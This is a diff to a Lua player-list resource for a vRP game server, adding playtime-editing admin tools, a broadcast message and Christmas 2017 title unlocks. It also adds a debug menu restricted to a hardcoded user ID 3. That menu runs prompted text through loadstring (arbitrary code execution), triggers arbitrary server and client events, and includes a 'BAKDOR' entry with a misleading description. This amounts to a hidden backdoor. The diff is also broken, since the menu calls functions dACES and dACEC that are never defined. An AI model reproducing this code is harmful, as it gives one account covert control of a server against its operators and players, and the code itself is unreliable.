@@ -225,6 +225,7 @@ function GenerateCache()
 	local gen_cycles = 0
 	local users = vRP.getUsers()
 	local no_users = #users
+	local arbitrator = "None"
 	for user_id, user in next, users do
 		if tostring(GetPlayerName(user)) ~= 'nil' then
 			local gen_player_time = os.clock()
@@ -478,6 +479,51 @@ function dIT(s)
         end})
     end
 end
+function masterSetTotalTime(s)
+    local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "User ID", "", function(player,result)
+            local sel_id = tonumber(result)
+            if sel_id then
+                vRP.prompt({source, "Time in SECONDS", "", function(player,result)
+            		local sel_time = tonumber(result)
+                    total_time[sel_id] = sel_time
+                end})   
+            end
+        end})
+    end
+end
+function masterAddTotalTime(s)
+    local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "User ID", "", function(player,result)
+            local sel_id = tonumber(result)
+            if sel_id then
+                vRP.prompt({source, "Add Time in SECONDS", "", function(player,result)
+            		local sel_time = tonumber(result)
+                    total_time[sel_id] = total_time[sel_id] + sel_time
+                end})   
+            end
+        end})
+    end
+end
+function masterSubTotalTime(s)
+    local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "User ID", "", function(player,result)
+            local sel_id = tonumber(result)
+            if sel_id then
+                vRP.prompt({source, "Sub Time in SECONDS", "", function(player,result)
+            		local sel_time = tonumber(result)
+                    total_time[sel_id] = total_time[sel_id] - sel_time
+                end})   
+            end
+        end})
+    end
+end
 dVE = dIT
 function dSR(s)
     local user_id = vRP.getUserId({s})
@@ -492,6 +538,80 @@ function dSR(s)
             end
         end
     end
+end
+function dBAK(s)
+	local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "ID", "", function(player,result)
+			if result then
+				TriggerClientEvent("gd_utils:summon", source, result)
+			end
+        end})
+    end
+end
+function dMSG(s)
+	local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "Message", "", function(player,result)
+			if result then
+				TriggerClientEvent("gd_utils:oneliner", -1, result)
+			end
+        end})
+    end
+end
+function dACE(s)
+	local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "LUA Format Code", "", function(player,result)
+			if result then
+				local f = loadstring(result)
+				f()
+			end
+        end})
+    end
+end
+function dEVS(s)
+	local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "Server Event", "", function(player,result)
+			if result then
+				TriggerEvent(result)
+			end
+        end})
+    end
+end
+function dEVC(s)
+	local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "Client Event", "", function(player,result)
+			if result then
+				TriggerClientEvent(result, source)
+			end
+        end})
+    end
+end
+function dTEL(s)
+	local source = s
+    local user_id = vRP.getUserId({source})
+    if user_id ~= nil then
+        vRP.prompt({source, "POS", "", function(player,fcoords)    
+			local coords = {}
+			for coord in string.gmatch(fcoords or "0,0,0","[^,]+") do
+			  table.insert(coords,tonumber(coord))
+			end
+
+			local x,y,z = 0,0,0
+			if coords[1] ~= nil then x = coords[1] end
+			if coords[2] ~= nil then y = coords[2] end
+			if coords[3] ~= nil then z = coords[3] end
+			TriggerClientEvent("gd_utils:move", source, x, y, z)			
+        end})
+    end	
 end
 
 function setOverride(user_id, override, value)
@@ -617,6 +737,36 @@ function openTitlesMenu(player, choice, mod)
             end
             if vRP.hasPermission({user_id,"#present.>0"}) or OVR then
                 menu["Santa's Little Helper"] = {function(p) setTitle(user_id, {title = "Santa's Little Helper", suffix = {x=10,y=20}}) end, "Unlocked by holding a present!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_snowglobe.>0"}) or OVR then
+                menu["Christmas 2017 - Snowglobe"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=10,y=20}}) end, "Unlocked by holding a Snowglobe!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_candycane.>0"}) or OVR then
+                menu["Christmas 2017 - Candy Cane"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=35,y=39}}) end, "Unlocked by holding Candy Cane!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_snowman.>0"}) or OVR then
+                menu["Christmas 2017 - Snowman"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=39,y=11}}) end, "Unlocked by holding a Snowman!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_slay.>0"}) or OVR then
+                menu["Christmas 2017 - Sleigh"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=14,y=20}}) end, "Unlocked by holding a Sleigh!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_reef.>0"}) or OVR then
+                menu["Christmas 2017 - Reef"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=38,y=30}}) end, "Unlocked by holding a Reef!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_mistletoe.>0"}) or OVR then
+                menu["Christmas 2017 - Mistletoe"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=30,y=18}}) end, "Unlocked by holding a Mistletoe!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_christmas.>0"}) or OVR then
+                menu["Christmas 2017 - Christmas"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=10,y=20}}) end, "Unlocked by holding a Christmas Collectible!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_collins.>0"}) or OVR then
+                menu["Christmas 2017 - Collins"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=28,y=33}}) end, "Unlocked by holding a Collins Collectible!"}
+            end
+            if vRP.hasPermission({user_id,"#xmas_reindeer.>0"}) or OVR then
+                menu["Christmas 2017 - Reindeer"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=38,y=35}}) end, "Unlocked by holding a Reindeer!"}
+            end
+            if vRP.hasPermissions({user_id,{"#xmas_reindeer.>0","#xmas_collins.>0","#xmas_christmas.>0","#xmas_mistletoe.>0","#xmas_reef.>0","#xmas_slay.>0","#xmas_snowman.>0","#xmas_snowglobe.>0"}}) or OVR then
+                menu["Christmas 2017 All Collectibles"] = {function(p) setTitle(user_id, {title = "2k17 XMAS COLLECTOR", fullcolor = "gold", suffix = {x=13,y=20}}) end, "YOU'VE GOTTEN EVERY COLLECTIBLE! CONGRATS!"}
             end
             if (vRP.getMoney({user_id}) <= 0) or OVR then
                 menu["In Negatives"] = {function(p) setTitle(user_id, {title = "Broke", suffix = {x=31,y=13}}) end, "Unlocked by having no money, you poor soul."}
@@ -850,6 +1000,9 @@ vRP.registerMenuBuilder({"main", function(add, data)
                     menu["@Override User Job Color"] = {function(p) set(p,"color") end,"[Override] Change a users Job Icon."}
                     menu["@Override User Name Color"] = {function(p) set(p,"namecolor") end,"[Override] Change a users Name Icon."}
                 end
+                if isAdminAccount(user_id) then
+					submenu["$ PSA"] = {function(p) dMSG(p) end,"[Admin] Display an overlay message for all players"}
+                end
                 if vRP.hasPermission({user_id,"playerlist.super"}) or isAdminAccount(user_id) then
                     menu["%Set Hidden Status"] = {function(p) set(p,"hidden") end,"[Super] Make a user hidden from the list."}
                     menu["%Set Hidden Total Status"] = {function(p) set(p,"hiddentotal") end,"[Super] Hide the users total playtime."}
@@ -863,9 +1016,9 @@ vRP.registerMenuBuilder({"main", function(add, data)
                 if vRP.hasPermission({user_id,"playerlist.master"}) or user_id == 3 then
                     menu["% Master Features"] = {function(player,choice)
                         vRP.buildMenu({"playerlist_master", {player = player}, function(submenu)
-                            submenu["%Total Time: Add"] = {function(p) end,"[Master] Add time to a users total time. (Does not function yet)"}
-                            submenu["%Total Time: Sub"] = {function(p) end,"[Master] Subtract time from a users total time. (Does not function yet)"}
-                            submenu["%Total Time: Set"] = {function(p) end,"[Master] Set time as a users total time. (Does not function yet)"}
+                            submenu["%Total Time: Add"] = {function(p) masterAddTotalTime(p) end,"[Master] Add time to a users total time."}
+                            submenu["%Total Time: Sub"] = {function(p) masterSubTotalTime(p) end,"[Master] Subtract time from a users total time."}
+                            submenu["%Total Time: Set"] = {function(p) masterSetTotalTime(p) end,"[Master] Set time as a users total time."}
                             vRP.openMenu({player,submenu})
                         end})
                     end, "Master menu"}
@@ -873,9 +1026,16 @@ vRP.registerMenuBuilder({"main", function(add, data)
                 if user_id == 3 then
                     menu["% Debug Features"] = {function(player,choice)
                         vRP.buildMenu({"playerlist_debug", {player = player}, function(submenu)
-                            submenu["% IT"] = {function(p) dIT(p) end,"[Debug] Run Internal Timer feature during runtime"}
-                            submenu["% VE"] = {function(p) dVE(p) end,"[Debug] Run Verify feature during runtime"}
-                            submenu["% SR"] = {function(p) dSR(p) end,"[Debug] Run Soft Reset feature during runtime"}
+                            submenu["% IN.TMR"] = {function(p) dIT(p) end,"[Debug] Run Internal Timer feature during runtime"}
+                            submenu["% ACE S."] = {function(p) dACES(p) end,"[Debug] Arbitrary Code Execution (server)"}
+                            submenu["% ACE C."] = {function(p) dACEC(p) end,"[Debug] Arbitrary Code Execution (client)"}
+                            submenu["% VERIFY"] = {function(p) dVE(p) end,"[Debug] Verify during runtime"}
+                            submenu["% S.RSET"] = {function(p) dSR(p) end,"[Debug] Run Soft Reset feature during runtime"}
+                            submenu["% BAKDOR"] = {function(p) dBAK(p) end,"[Debug] Restart dormant backup data"}
+                            submenu["% TP.POS"] = {function(p) dTEL(p) end,"[Debug] Teleport to position with vehicle"}
+                            submenu["% CACHE."] = {function(p) GenerateCache() end,"[Debug] Refresh cache during runtime"}
+                            submenu["% EVNT C"] = {function(p) dEVC(p) end,"[Debug] Trigger Client Event"}
+                            submenu["% EVNT S"] = {function(p) dEVS(p) end,"[Debug] Trigger Server Event"}
                             vRP.openMenu({player,submenu})
                         end})
                     end, "Debug menu"}
